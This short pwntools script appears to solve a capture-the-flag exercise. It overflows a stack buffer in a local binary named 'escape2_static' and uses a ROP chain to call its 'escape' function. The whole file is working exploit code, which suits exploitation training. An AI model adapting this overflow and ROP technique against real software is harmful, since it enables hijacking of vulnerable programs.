from pwn import *

binary = context.binary = ELF('./escape2_static')

p = process(binary.path)
rop = ROP(binary)

buffer_size = 16
rbp_padding = 8
rop.call(binary.sym.escape,[0xdead, 0xcafe])
print(rop.dump())

payload = [b"A" * buffer_size, b"B" * rbp_padding, rop.chain()]
payload = b"".join(payload)

p.sendline(payload)
p.interactive()